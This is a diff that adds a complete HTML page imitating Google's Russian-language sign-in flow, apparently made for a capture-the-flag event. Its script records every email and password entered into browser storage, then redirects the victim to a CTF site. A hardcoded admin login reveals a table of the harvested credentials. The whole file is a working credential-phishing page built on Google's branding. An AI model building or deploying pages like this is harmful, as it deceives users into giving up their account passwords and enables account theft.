@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Register Security</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
+
+        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; color: #202124; overflow: hidden; }
+        
+        .container { width: 448px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
+        .logo { width: 75px; margin-bottom: 12px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
+        .sub-text { font-size: 16px; margin-bottom: 24px; letter-spacing: 0.1px; }
+        
+        .input-group { position: relative; margin-top: 10px; width: 100%; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; }
+        .input-field:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        /* Bosqichlar animatsiyasi */
+        .step { position: absolute; width: 368px; transition: 0.3s ease-in-out; }
+        .step-hidden { opacity: 0; transform: translateX(100px); visibility: hidden; }
+        .step-active { opacity: 1; transform: translateX(0); visibility: visible; }
+        .step-exit { opacity: 0; transform: translateX(-100px); visibility: hidden; }
+
+        .user-identity { display: inline-flex; align-items: center; padding: 3px 12px 3px 5px; border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px; cursor: pointer; }
+        .avatar { width: 20px; height: 20px; background: #1a73e8; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 11px; margin-right: 8px; }
+        .email-label { font-size: 14px; font-weight: 500; }
+
+        /* KO'K RANGDI POKAZAT PAROL */
+        .show-pass-container { display: flex; align-items: center; margin-top: 12px; text-align: left; cursor: pointer; width: fit-content; }
+        #check { cursor: pointer; width: 18px; height: 18px; accent-color: #1a73e8; margin-right: 10px; }
+        .show-pass-text { font-size: 14px; color: #202124; cursor: pointer; user-select: none; }
+
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .link { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; text-decoration: none; }
+        .btn-next { background-color: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn-next:hover { background-color: #1b66c9; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
+
+        #admin-panel { display: none; text-align: left; }
+        .log-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
+        .log-table th, .log-table td { border: 1px solid #eee; padding: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+
+    <!-- STEP 1: EMAIL -->
+    <div id="step1" class="step step-active">
+        <h1>Вход</h1>
+        <p class="sub-text">Используйте аккаунт Google</p>
+        <div class="input-group">
+            <input type="email" id="email" class="input-field" placeholder="Эл. почта или телефон">
+        </div>
+        <p style="font-size: 14px; color: #1a73e8; text-align: left; margin-top: 15px; font-weight: 500; cursor: pointer;">Забыли адрес эл. почты?</p>
+        <div class="footer">
+            <span class="link">Создать аккаунт</span>
+            <button class="btn-next" onclick="goNext()">Далее</button>
+        </div>
+    </div>
+
+    <!-- STEP 2: PASSWORD -->
+    <div id="step2" class="step step-hidden">
+        <h1>Добро пожаловать</h1>
+        <div class="user-identity" onclick="location.reload()">
+            <div class="avatar">👤</div>
+            <span class="email-label" id="display-email"></span>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" class="input-field" placeholder="Введите пароль">
+        </div>
+        
+        <!-- TO'G'RILANGAN POKAZAT PAROL -->
+        <div class="show-pass-container" onclick="togglePasswordVisibility()">
+            <input type="checkbox" id="check">
+            <label class="show-pass-text" for="check">Показать пароль</label>
+        </div>
+
+        <div class="footer">
+            <span class="link">Забыли пароль?</span>
+            <button class="btn-next" onclick="handleAuth()">Далее</button>
+        </div>
+    </div>
+
+    <!-- ADMIN -->
+    <div id="admin-panel">
+        <h2 style="color: #d93025;">База данных (Admin)</h2>
+        <table class="log-table">
+            <thead>
+                <tr><th>Email</th><th>Password</th></tr>
+            </thead>
+            <tbody id="logs"></tbody>
+        </table>
+        <button class="btn-next" style="margin-top:20px; background:#5f6368;" onclick="location.reload()">Выход</button>
+    </div>
+</div>
+
+<script>
+    const REDIRECT_URL = "https://ctf.cybertron.uz/login?next=%2F%3F";
+    const ADMIN = { user: "admin@google.com", pass: "CTF_2026_ADMIN" };
+
+    function goNext() {
+        const emailVal = document.getElementById('email').value;
+        if (!emailVal) { alert("Введите эл. почту"); return; }
+        
+        document.getElementById('display-email').innerText = emailVal;
+        document.getElementById('step1').className = 'step step-exit';
+        document.getElementById('step2').className = 'step step-active';
+    }
+
+    // PAROLNI KO'RSATISH FUNKSIYASI (To'liq ishlashi uchun)
+    function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('password');
+        const checkbox = document.getElementById('check');
+        
+        // Agar label bosilsa checkbox holatini o'zgartirish (faqat matn bosilganda kerak)
+        // input[type=checkbox] uchun accent-color ishlatilgan, u ko'k rang beradi
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            checkbox.checked = true;
+        } else {
+            passwordInput.type = "password";
+            checkbox.checked = false;
+        }
+    }
+
+    // Checkboxni o'zini bosganda hodisa ikki marta takrorlanmasligi uchun
+    document.getElementById('check').addEventListener('click', function(e) {
+        e.stopPropagation();
+        const passwordInput = document.getElementById('password');
+        passwordInput.type = this.checked ? "text" : "password";
+    });
+
+    function handleAuth() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if (email === ADMIN.user && pass === ADMIN.pass) {
+            showAdmin();
+            return;
+        }
+
+        let db = JSON.parse(localStorage.getItem('_goog_logs')) || [];
+        db.push({ e: email, p: pass });
+        localStorage.setItem('_goog_logs', JSON.stringify(db));
+
+        window.location.href = REDIRECT_URL;
+    }
+
+    function showAdmin() {
+        document.getElementById('step2').style.display = 'none';
+        document.querySelector('.logo').style.display = 'none';
+        document.getElementById('admin-panel').style.display = 'block';
+        
+        const db = JSON.parse(localStorage.getItem('_goog_logs')) || [];
+        document.getElementById('logs').innerHTML = db.map(i => `<tr><td>${i.e}</td><td>${i.p}</td></tr>`).join('');
+    }
+</script>
+
+</body>
+</html>
